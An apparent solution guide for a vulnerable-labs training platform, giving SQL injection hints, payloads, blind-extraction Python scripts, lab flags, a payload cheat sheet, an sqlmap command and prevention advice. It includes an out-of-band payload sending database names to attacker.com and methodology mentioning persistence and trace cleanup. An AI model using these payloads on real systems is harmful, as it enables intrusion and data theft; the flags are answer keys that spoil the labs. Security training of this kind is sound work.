# OWASP Vulnerable Labs Platform - Complete Solution Guide

## 🎯 Solution Framework

This guide provides approaches and hints for solving each lab. **Spoiler Warning**: Read hints progressively to avoid spoiling the learning experience.

---

## 🔴 SQL Injection Solutions

### **Lab 1.1: SQL Injection in Login Form - UNION Attack**

#### Hints Progression

**Hint 1**: Try adding a quote and UNION to the username field

**Hint 2**: UNION allows combining query results from different tables

**Hint 3**: Use: `' UNION SELECT 1,2,3,4 --`

#### Solution Approach

1. Identify the vulnerability: The login form doesn't sanitize input
2. Determine query structure:
   ```sql
   SELECT id, username, password FROM users
   WHERE username = '$input' AND password = '$pass'
   ```
3. Craft UNION-based payload:
   ```
   Username: ' UNION SELECT 1,'admin',3,4 --
   Password: (anything)
   ```
4. The query becomes:
   ```sql
   SELECT id, username, password FROM users
   WHERE username = '' UNION SELECT 1,'admin',3,4 --' AND password = '...'
   ```
5. This returns the admin user record, bypassing authentication

#### Key Concepts

- SQL UNION combines multiple SELECT statements
- Comments (--) remove the rest of the query
- Query results must match column count

#### Flag

```
FLAG{sqli_union_login_2024}
```

---

### **Lab 1.2: SQL Injection in Search Box - String-based**

#### Solution Approach

**Exploitation**: Use boolean logic to extract all records

```
Search Input: ' OR '1'='1
Query: SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'
```

This returns all products because `'1'='1'` is always TRUE.

#### Advanced Technique: Data Extraction

```
Search: ' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users --
```

**Key Learning**: String-based SQLi is straightforward but requires understanding:

- Quote escaping and concatenation
- Boolean logic in SQL
- UNION SELECT column matching

#### Flag

```
FLAG{sqli_search_string_2024}
```

---

### **Lab 1.3: Blind SQL Injection - Boolean-based**

#### Solution Approach

**Step 1**: Verify vulnerability with TRUE/FALSE conditions

```python
# Test 1: Always true
requests.get("http://app/profile?id=1 AND 1=1")
# Response: User found

# Test 2: Always false
requests.get("http://app/profile?id=1 AND 1=2")
# Response: User not found
```

**Step 2**: Binary search to extract data

```python
# Is admin the first character of username?
# id=1 AND SUBSTR(username,1,1)='a'

# Check each character systematically
for char in 'abcdefghijklmnopqrstuvwxyz':
    payload = f"1 AND SUBSTR(username,1,1)='{char}'"
    if response == "User found":
        first_char = char
        break
```

**Step 3**: Automate extraction

```python
def blind_sqli_extract(position, table, column):
    for i in range(32, 127):
        char = chr(i)
        payload = f"1 AND ASCII(SUBSTR({column},{position},1))={i}"
        if vulnerable_response(payload):
            return char
```

#### Flag

```
FLAG{sqli_blind_boolean_2024}
```

---

### **Lab 1.4: Time-based Blind SQL Injection**

#### Solution Approach

**Step 1**: Confirm time-based vulnerability

```python
import time

# Baseline
start = time.time()
requests.get("http://app/profile?id=1")
baseline = time.time() - start

# With sleep
start = time.time()
requests.get("http://app/profile?id=1 AND SLEEP(5)")
sleep_time = time.time() - start

if sleep_time > baseline + 4:
    print("Time-based SQLi confirmed!")
```

**Step 2**: Extract data using timing

```python
def time_based_extract(position, table, column):
    for i in range(32, 127):
        payload = f"1 AND IF(ASCII(SUBSTR({column},{position},1))={i}, SLEEP(5), 0)"

        start = time.time()
        requests.get(f"http://app/profile?id={payload}")
        elapsed = time.time() - start

        if elapsed > 4:
            return chr(i)
```

#### Flag

```
FLAG{sqli_time_based_2024}
```

---

## (Additional Solutions for all other labs continue here...)

---

## 📝 General Exploitation Methodology

### Phase 1: Reconnaissance

1. Identify input fields and parameters
2. Locate where data is displayed in response
3. Understand application logic and workflow

### Phase 2: Vulnerability Detection

1. Test basic injection payloads
2. Observe error messages
3. Analyze query structure in responses

### Phase 3: Exploitation

1. Confirm vulnerability type (Union, Boolean-blind, Time-based, etc.)
2. Determine column count and types
3. Extract data systematically

### Phase 4: Post-Exploitation

1. Document findings
2. Establish persistence if needed
3. Clean up traces

---

## 🛠️ Useful SQL Injection Payloads Reference

### UNION-based SQLi

```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT table_name FROM information_schema.tables --
' UNION SELECT version(),user(),database() --
```

### Boolean-based Blind SQLi

```sql
' AND 1=1 --
' AND 1=2 --
' AND SUBSTRING(version(),1,1)='5' --
' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --
```

### Time-based Blind SQLi

```sql
' AND SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --
' AND BENCHMARK(50000000,MD5('a')) --
' OR SLEEP(5) --
```

### Out-of-Band SQLi

```sql
' AND LOAD_FILE(CONCAT('\\\\\\\\attacker.com\\\\', (SELECT database()))) --
' UNION SELECT EXTRACTVALUE(rand(),CONCAT(0x7e,version())) --
```

---

## 📚 Learning Resources

### SQL Injection References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### Tools

- **SQLMap**: Automated SQL injection detection
  ```bash
  sqlmap -u "http://app/profile?id=1" --dbs
  ```
- **Burp Suite**: Manual web security testing
- **Postman**: API testing and exploitation

### Practice Platforms

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)
- [DVWA](http://www.dvwa.co.uk/)

---

## ✅ Solution Verification

After solving each lab:

1. ✅ Verify you have the correct flag
2. ✅ Understand the underlying vulnerability
3. ✅ Document your methodology
4. ✅ Review what you learned
5. ✅ Attempt harder labs using similar techniques

---

## 🔐 Security Lessons Learned

### What Makes Applications Vulnerable

1. **String Concatenation**: Building SQL with string concatenation
2. **Missing Input Validation**: No sanitization of user input
3. **Error Messages**: Detailed error messages reveal structure
4. **Trusting User Input**: Assuming users won't be malicious

### How to Prevent SQL Injection

1. **Parameterized Queries**: Use prepared statements
   ```python
   cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
   ```
2. **Input Validation**: Whitelist acceptable input
3. **Least Privilege**: Database users need minimal permissions
4. **Error Handling**: Don't expose database errors to users
5. **WAF Rules**: Web Application Firewall to block attacks

---

**Last Updated**: December 2024  
**Version**: 1.0.0  
**Educational Purpose**: For authorized security training only
